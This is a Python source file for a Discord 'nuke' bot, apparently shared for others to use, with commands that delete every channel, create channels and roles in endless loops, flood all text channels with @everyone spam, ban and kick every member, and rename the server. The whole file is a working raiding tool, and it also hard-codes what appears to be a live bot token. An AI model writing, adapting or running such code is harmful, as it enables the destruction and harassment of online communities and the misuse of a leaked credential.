
# Source By Sepehr
# If you have question or problem send message on my discord `Sepehr#1266


# ............MODULES.............
import discord
from discord.ext import commands

# .............CORE.............
TOKEN = 'MTA0NzA5NTkzMjA3MzgwNzg4Mg.G42QfN.9S7V_AUz1q6SK529iKh3cpjQG7VSlj2s0sQjg4'  # Paste your bot token
PREFIX = '!'  # Write one prefix for bot
NAME = 'POKO ON TOP'   # Write one name for servername, channelsname, rolename
MESSAGE = '@everyone '  # Write one message for spamming


naame = NAME
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX ,intents=intents)
bot.remove_command("help")


# .............READY.............
@bot.event
async def on_ready():
    print("Bot Is Run!")


# .............DELETE CHANNELS.............
@bot.command()
async def nuke(ctx):
    for c in ctx.guild.channels:
        await c.delete()
    guild = ctx.message.guild
    await guild.create_text_channel(naame)


# .............CHANNEL SPAMING.............
@bot.command()
async def cs(ctx):
    await ctx.reply('**Done!**')
    while True:
        guild = ctx.message.guild
        await guild.create_text_channel(naame)


# .............ROLE SPAMING.............
@bot.command()
async def rs(ctx):
    await ctx.reply('**Done!**')
    guild = ctx.guild
    while True:
        await guild.create_role(name=naame)


# .............MESSAGE SPAMING.............
@bot.command()
async def ms(ctx):
    while True:
        for channel in ctx.guild.text_channels:
            await channel.send(MESSAGE)
            await channel.send(MESSAGE)
            await channel.send(MESSAGE)
            await channel.send(MESSAGE)


# .............BAN ALL.............
@bot.command()
async def bs(ctx):
    await ctx.reply('**Done!**')
    for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            pass


# .............KICK ALL.............
@bot.command()
async def ks(ctx):
    await ctx.reply('**Done!**')
    for user in ctx.guild.members:
        try:
            await user.kick()
        except:
            pass


# .............SERVER NAME.............
@bot.command()
async def sn(ctx):
    await ctx.reply('**Done!**')
    guild = ctx.guild
    await ctx.guild.edit(name=naame)

# .............RUNNING.............
bot.run(TOKEN)
